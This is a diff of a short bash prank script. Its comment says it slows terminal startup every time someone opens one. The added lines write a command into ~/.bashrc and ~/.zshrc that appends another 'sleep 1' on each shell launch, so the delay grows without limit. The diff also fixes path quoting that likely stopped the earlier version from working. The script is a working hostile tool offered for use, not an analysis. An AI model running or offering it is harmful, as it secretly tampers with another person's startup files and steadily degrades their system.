@@ -1,4 +1,5 @@
 #!/bin/bash
-(cd ~ && echo "echo 'sleep 1' >> ~/.bashrc" >> "~/.bashrc" && cd -) > /dev/null
-(cd ~ && echo "echo 'sleep 1' >> ~/.zshrc" >> "~/.zshrc" && cd -) > /dev/null
+# Desc: slow down the startup of the terminal every time someone open one
+echo "echo 'sleep 1' >> ~/.bashrc" >> ~/.bashrc
+echo "echo 'sleep 1' >> ~/.zshrc" >> ~/.zshrc
 clear
